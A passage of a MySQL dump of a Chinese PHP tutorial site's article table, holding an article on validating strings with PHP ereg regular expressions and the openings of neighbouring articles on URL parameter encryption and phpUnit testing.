''key'';&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n//生产加密参数地址&amp;nbsp;&lt;br /&gt;\r\nfor ($i=0;$i&amp;lt;10;$i++)&amp;nbsp;&lt;br /&gt;\r\n{&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;echo &quot;&amp;lt;a href=./deurl.php?url=&quot;.encrypt_url(&quot;id=$i&amp;amp;sdf=asdf&amp;amp;time=&quot;.time(),$key).&quot;&amp;gt;&lt;a href=&quot;http://www.phpxd.com/jishuwenzhang/phpwzxxi.php&quot; style=&quot;color:#ffff26;text-decoration:none;font-size:14px;font-weight:bold;&quot;&gt;&lt;strong style=&quot;font-size:12px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;font-family:宋体;font-weight:normal;&quot;&gt;php技术文章&lt;/strong&gt;&lt;/a&gt;$i&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&quot;;&amp;nbsp;&lt;br /&gt;\r\n}&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n//获取参数地址&amp;nbsp;&lt;br /&gt;\r\n$get = geturl($_GET[''url''],$key);&amp;nbsp;&lt;br /&gt;\r\nvar_dump($get);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n?&amp;gt;&lt;/code&gt;&lt;/p&gt;\r\n&lt;/p&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1303622210, 1, 'admin'),
(79, 1, 'PHP和正则表达式', '', '', '&lt;div&gt;什么是正则表达式?&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;你对从一个不错的老的基于控制的文本编辑器中分离出像BBEdit和notepad的程序，有什么看法呢？两个都支持文本输入，可以让你保存文本到文件中，但是现在的文本编辑器也支持其它功能，包括查找–代替工具，这让编辑一个文本文件相当容易。&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 正则表达式也是相似的，只是更好一些。正则表达式可以被认为一个极其高级的查找-替换工具，让我们从痛苦中摆脱出来：不必再写定制的数据确认例子来检查电子邮件地址或者来确认电话号码的格式是正确的，如此等等。&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 任何程序中最普通的函数之一就是数据有效性检查，PHP捆绑了一些文本检查函数，允许我们用正则表达式匹配一个字符串，确认有一个空格，有一个问号，等等。&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; 你不知道的可能是，正则表达式可以简单装备吗，当你掌握了一些正则表达式时(这个正则表达式可以用来告诉正则表达式引擎一个字符串中我们想要匹配的部分)，你会自问为什么会把正则表达式扔到角落里这么久，^_^。&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; PHP有两套函数，用来处理两种类型的正则表达式:Perl5兼容模式，和Posix标准兼容模式。在这篇文章中我们将看看ereg函数，用遵照Posix标准的搜索表达式工作。虽然它们并没有Perl5模式那样强大，但是一种不错的学习正则表达式的方法。如果你对PHP支持的Perl5兼容正则表达式感兴趣，可以到PHP.net网站找一些关于preg函数的细节。&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; PHP有六个函数来处理正则表达式，它们都把一个正则表达式作为它们的第一个参数，列出如下：&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;ereg: 最常用的正则表达式函数, ereg 允许我们搜索跟一个正则表达式匹配的一个字符串.&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ereg_replace: 允许我们搜索跟正则表达式匹配的一个字符串，并用新的字符串代替所有这个表达式出现的地方。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;eregi: 和ereg几乎是一样效果，不过忽略大小写。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;eregi_replace: 和ereg_replace有着一样的搜索-替换功能，不过忽略大小写.&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;split: 允许我们搜索和正则表达式匹配的字符串，并且以字符串集合的方式返回匹配结果.&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;spliti: split函数忽略大小写的版本.&lt;/div&gt;\r\n&lt;div&gt;为什么使用正则表达式?&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; 如果你不断地建立不同的函数来检查或者操作字符串的一部分，现在你可能要放弃所有的这些函数，取而代之的用正则表达式。如果你对下列的问题都答“是的”，那么你肯定要考虑使用正则表达式了：&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;你是否正在写一些定制的函数来检查表单数据（比如在电子信箱地址中的一个@，一个点）?&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;你是否写一些定制的函数，在一个字符串中循环每个字符，如果这个字符匹配了一个特定特征（比如它是大写的，或者它是一个空格），那么就替换它?&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;除了是令人不舒服的字符串检查和操作方法，如果没有有效率地写代码，上述的两条也会使你的程序慢下来。你是否更倾向于用下面的代码检查一个电子信箱地址呢:&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;function validateEmail($email)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;$hasAtSymbol = strpos($email, &quot;@&quot;);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;$hasDot = strpos($email, &quot;.&quot;);&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;if($hasAtSymbol &amp;amp;&amp;amp; $hasDot)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return true;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;else&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return false;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;echo validateEmail(&quot;mitchell@devarticles.com&quot;);&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;... 或者使用下面的代码:&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;function validateEmail($email)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;return ereg(&quot;^[a-zA-Z]+@[a-zA-Z]+\\.[a-zA-Z]+$&quot;, $email);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;echo validateEmail(&quot;mitchell@devarticles.com&quot;);&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;可以肯定的是，第一个函数比较容易，而且看起来结构也不错。但是如果我们用上面的下一个版本的email地址检查函数不是更容易吗？&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;上面展示的第二个函数只用了正则表达式，包括了对ereg函数的一个调用。Ereg 函数返回true或者false,来声明它的字符串参数是否和正则表达式相匹配。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;很多编程者避开正则表达式，只因为它们（在一些情况下）比其它的文本处理方法更慢。正则表达式可能慢的原因是因为它们涉及把字符串在内存中拷贝和粘贴，因为正则表达式的每一个新的部分都对应匹配一个字符串。但是，从我对正则表达式的经验来说，除非你在文本中几百个行运行一个复杂的正则表达式，否则性能上的缺陷都可以忽略不计，当把正则表达式作为输入数据检查工具时，也很少出现这种情况。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;正则表达式语法&lt;/div&gt;\r\n&lt;div&gt;在你可以匹配一个字符串到正则表达式之前，你必须先建立正则表达式。开始的时候，正则表达式的语法有点古怪，表达式中的每一个短语代表某个类型的搜索特征。下列是一些最普通的正则表达式，也都对应着一个如何使用它的例子:&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;字符串头部&lt;/div&gt;\r\n&lt;div&gt;搜索一个字符串的头部，用^,例如&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;^hello&quot;, &quot;hello world!&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;将返回 true, 但是&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;^hello&quot;, &quot;i say hello world&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;将返回 false, 因为hello不在字符串”I say hello world”的头部。&lt;/div&gt;\r\n&lt;div&gt;字符串尾部&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;搜索字符串尾部，用$,例如：&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;bye$&quot;, &quot;goodbye&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;将返回true, 但是&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;bye$&quot;, &quot;goodbye my friend&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;将返回 false,因为bye不在字符串”goodbye my friend”的尾部.&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;任意的单个字符&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;搜索任意字符，用点(.),例如：&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;.&quot;, &quot;cat&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;将返回true,但是&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;.&quot;, &quot;&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;将返回false,因为我们的要搜索字符串没有包含字符。你可以用花括号随意告诉正则表达式引擎它要匹配多少个单个字符。如果我只想匹配5个字符，我可以这样用ereg:&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;.{5}$&quot;, &quot;12345&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;上面的这段代码告诉正则表达式引擎当且仅当至少5个连续的字符出现字符串的尾部时返回true.我们也可以限制连续出现的字符的数目：&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;a{1,3}$&quot;, &quot;aaa&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;在上面的例子里，我们已经告诉正则表达式引擎，我们的搜索字符串来匹配表达式，它在尾部必须有介于1和3个的”a”字符。&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;a{1,3}$&quot;, &quot;aaab&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;上面的例子将不会返回true，虽然有三个”a”字符在搜索字符串里，但是它们不是在字符串的尾部。如果我们把结尾字符串匹配$从正则表达式中去掉，那么这个字符串是匹配的。&lt;/div&gt;\r\n&lt;div&gt;我们也可以告诉正则表达式引擎来匹配至少有确定数目的字符在一行，如果它们存在的，可以匹配更多。 我们可以这样做：&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;a{3,}$&quot;, &quot;aaaa&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;零或多次重复字符&lt;/div&gt;\r\n&lt;div&gt;为了告诉正则表达式引擎一个字符可能存在，也可以重复，我们用*字符。这里的两个例子都将返回true.&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;t*&quot;, &quot;tom&quot;); ?&amp;gt;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;t*&quot;, &quot;fom&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;即使第二个例子不包含”t”这个字符，但仍旧返回ture,因为*表示字符可以出现，但不是必须出现。事实上，任何普通的字符串模式都会使上面的ereg调用返回true，因为’t’字符是可选的.&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;一或多次重复字符&lt;/div&gt;\r\n&lt;div&gt;为了告诉正则表达式引擎一个字符必须存在，也可以重复不止一次，我们用+字符，像&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;z+&quot;, &quot;i like the zoo&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;下面的例子也会返回true:&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;z+&quot;, &quot;i like the zzzzzzoo!&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;零或一次重复字符&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;我们也可以告诉正则表达式引擎，一个字符必须是或者只存在一次，或者没有。我们用?字符来做这项工作，就像&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;c?&quot;, &quot;cats are fuzzy&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;如果我们愿意，我们完全可以从上面的搜索字符串中删除’c’，这个表达式会仍旧返回true.’?’ 的意思是一个’c’可以出现在搜索字符串的任何地方，但不是必须的。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;正则表达式语法 (续)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;空格字符&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;为了匹配一个搜索字符串中的空格字符，我们用预定义Posix的类，[[:space]].方括号标明连续字符的相关性，”:space:”是实际要匹配的类（在这种情形下，是任何空白字符）。空白包括tab字符，新行字符，空白字符。或者，如果搜索字符串必须包含只有一个空格，而不是一个tab或者新行字符，你可以用一个空格字符(&quot; &quot;)。在大多数情况下，我倾向于使用&quot;:space:&quot;，因为这意味着我的意图不仅仅是单个空格字符，这点很容易被忽视。这里有一些Posix-标准预定义类，&lt;/div&gt;\r\n&lt;div&gt;有一些我们可以作为正则表达式的部分的一些Posix-标准预定义类，包括[:alnum:], [:digit:], [:lower:]等等。 完整的列表可以在这里查看&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;我们可以像这样匹配单个空白字符：&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;Mitchell[[:space:]]Harper&quot;, &quot;Mitchell Harper&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;我们也可以通过在表达式后用?字符来告诉正则表达式引擎匹配没有空白或者一个空白。&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;Mitchell[[:space:]]?Harper&quot;, &quot;MitchellHarper&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;模式分组&lt;/div&gt;\r\n&lt;div&gt;相关的模式可以在方括号里分在一起。很容易用[a-z]和[A-Z]指定只有一个小写字母或者一列大写字母以搜索字符串的一部分存在。&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;// 要求从第一个到最后一个都是小写字母&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo ereg(&quot;^[a-z]+$&quot;, &quot;johndoe&quot;); // 返回true&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;或者像&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;// 要求从第一个到最后一个都是大写字母&lt;/div&gt;\r\n&lt;div&gt;ereg(&quot;^[A-Z]+$&quot;, &quot;JOHNDOE&quot;); // 返回 true?&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;我们也可以告诉正则表达式引擎，我们希望或者是小写字母，或者是大写字母。我们只要把[a-z]和[A-Z]模式结合在一起就可以做到。&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;^[a-zA-Z]+$&quot;, &quot;JohnDoe&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;在上面的例子里，如果我们能匹配&quot;John Doe&quot;,而不是&quot;JohnDoe&quot;，将是非常有意义的。我们用下面的正则表达式来做这个：&lt;/div&gt;\r\n&lt;div&gt;^[a-zA-Z]+[[:space:]]{1}[a-zA-Z]+$&lt;/div&gt;\r\n&lt;div&gt;很容易搜索一个数字字符串&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;^[0-9]+$&quot;, &quot;12345&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;词语分组&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;不仅仅搜索模式可以分组，我们也可以用圆括号把相关的搜索词语进行分组。&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;^(John|Jane).+$&quot;, &quot;John Doe&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;在上面的例子中，我们有一个字符串头部字符，紧跟着&quot;John&quot;或者&quot;Jane&quot;,至少有一个其它字符，然后一个字符串尾部字符。所以…&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;^(John|Jane).+$&quot;, &quot;Jane Doe&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;...将也匹配我们的搜索模式&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;特殊字符的情形&lt;/div&gt;\r\n&lt;div&gt;因为一些字符要用在一个搜索模式的明确分组或者语法上，像在(John|Jane)中的圆括号，我们需要告诉正则表达式引擎来屏蔽这些字符，加工它们使之成为被搜索字符串的一部分，而不是搜索表达式的一部分。我们所用的方法称为“字符转义”，涉及到将任何“专用符号”加上反斜杠。所以，例如，如果我想在我的搜索中包含’|’，那么我就可以这样做&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php echo ereg(&quot;^[a-zA-z]+\\|[a-zA-z]+$&quot;, &quot;John|Jane&quot;); ?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;这里只是少量的一些你要转义的字符，你必须转义^, $, (, ), ., [, |, *, ?, +, \\ and { 。&lt;/div&gt;\r\n&lt;div&gt;希望你现在对正则表达式实际上有多么强大有了一点点感觉了。现在让我们看两个用正则表达式来检查数据中一个字符串的例子。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;正则表达式例子&lt;/div&gt;\r\n&lt;div&gt;例子1&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;让我们把第一个例子做的相当简单，检验一个标准的URL.一个标准的URL(没有端口号),有三个部分构成：&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;[协议]://[域名]&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;让我们从匹配URL的协议部分开始,并且让它只能用http或者ftp.我们可以用下面的正则表达式做到这点：&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;^(http|ftp)&lt;/div&gt;\r\n&lt;div&gt;^字符特指字符串的头部，利用圆括号把http和ftp围住，且用“或者”符号(|)将它们分开，我们告诉正则表达式引擎http和ftp两者之一必须在字符串的开头。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;一个域名通常由www.somesite.com构成，但是可以随意选择要不要www部分。为了例子简单，我们只允许.com,.net,和.org的域名是在考虑之中的。我们最好这样对正则表达式中的域名部分表示如下：&lt;/div&gt;\r\n&lt;div&gt;(www\\.)?.+\\.(com|net|org)$&lt;/div&gt;\r\n&lt;div&gt;把所有的东西放在一起，我们的正则表达式就可以用作检查一个域名，如：&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;function isValidDomain($domainName)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;return ereg(&quot;^(http|ftp)://(www\\.)?.+\\.(com|net|org)$&quot;, $domainName);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;//真(true)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo isValidDomain(&quot;http://www.somesite.com&quot;);&lt;/div&gt;\r\n&lt;div&gt;//真(true)&lt;/div&gt;\r\n&lt;div&gt;echo isValidDomain(&quot;ftp://somesite.com&quot;);&lt;/div&gt;\r\n&lt;div&gt;//假 (false)&lt;/div&gt;\r\n&lt;div&gt;echo isValidDomain(&quot;ftp://www.somesite.fr&quot;);&lt;/div&gt;\r\n&lt;div&gt;//假 (false)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo isValidDomain(&quot;www.somesite.com&quot;);&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;例子二&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;因为我居住在澳大利亚悉尼，让我们检查一个典型的澳大利亚国际电话号码。澳大利亚国际电话号码的格式如下：&lt;/div&gt;\r\n&lt;div&gt;+61x xxxx-xxxx&lt;/div&gt;\r\n&lt;div&gt;第一个x是区号，其它的都是电话号码。检查以''+61''开头且紧跟一个在2到9之间的区号的电话号码，我们用下面的正则表达式：&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;^\\+61[2-9][[:space:]]&lt;/div&gt;\r\n&lt;div&gt;注意，上面的搜索模式把''+''字符用''\\''转义，以便于可以在搜索中包含，不至于被解释为一个正则表达式。[2-9]告诉正则表达式引擎我们需要包含一个2到9之间的数字。[[:space:]]类则告诉正则表达式期望在这里有一个空白。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;这里是电话号码剩下的搜索模式：&lt;/div&gt;\r\n&lt;div&gt;[0-9]{4}-[0-9]{4}$&lt;/div&gt;\r\n&lt;div&gt;这里没有什么不寻常的地方，我们只是告诉正则表达式引擎电话号码可用的数字，它必须是4个数字的组合，跟着一个连接符，再跟着另一个4个数字的组合，然后一个字符串尾部字符。&lt;/div&gt;\r\n&lt;div&gt;把完整的正则表达式放在一起，放进一个函数，我们可以用代码来检查一些澳大利亚国际电话号码：&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;function isValidPhone($phoneNum)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo ereg(&quot;^\\+61[2-9][[:space:]][0-9]{4}-[0-9]{4}$&quot;, $phoneNum);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;// 真（true）&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo isValidPhone(&quot;+619 0000-0000&quot;);&lt;/div&gt;\r\n&lt;div&gt;// 假（false）&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo isValidPhone(&quot;+61 00000000&quot;);&lt;/div&gt;\r\n&lt;div&gt;//假（ false）&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo isValidPhone(&quot;+611 00000000&quot;);&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;总结&lt;/div&gt;\r\n&lt;div&gt;正则表达式用一些不适合书写和重复的代码来检查一个字符串。在最后的几页里，我们已经讲解了所有的Posix标准正则表达式的基础，包括字符，分组和PHP ereg函数。我们也知道了怎么用正则表达式来检查一些PHP中简单的字符串。&lt;/div&gt;\r\n', 1, 1, 0, 0, 1303622404, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(80, 1, '用phpUnit帮你调试php程序', '', '', '&lt;div&gt;调试程序是一个漫长的过程，程序越长越复杂，调试起来就愈加困难。如果你调试的是php程序，那么不妨采用phpUnit，它可以大大加快你的调试速度。&lt;/div&gt;\r\n&lt;div&gt;何谓PhpUnit&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;Phpunit 脱胎于Fred Yankowski编写的著名的Junit测试框架。你可以到它的网站 http://www.ontosys.com/phiki/phpunit 下载最新的版本。你可以利用phpUnit编写一套测试软件包。保证你的程序代码正确无误。只需一步便可自动完成所有的测试。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;如果监测到bug，你就可以再写一小段测试代码来找出错误之所在。日后若再有相同的bug出现，只要运行你先前的测试包，马上就可以抓到它。经常运行测试包便可以保证你的程序代码的强壮性。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;开　始&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;假设我们有一个银行账务处理程序。现在需要为Account (账户) 类编写一个测试软件包。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;以下是Account类 源代码：&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;class Account{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;var $balance;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function Account($initialBalance=0){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;balance = $initialBalance;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function withdraw($amount){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;balance -= $amount;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function deposit($amount){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;balance += $amount;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function getBalance(){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;return $this-&amp;gt;balance;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function 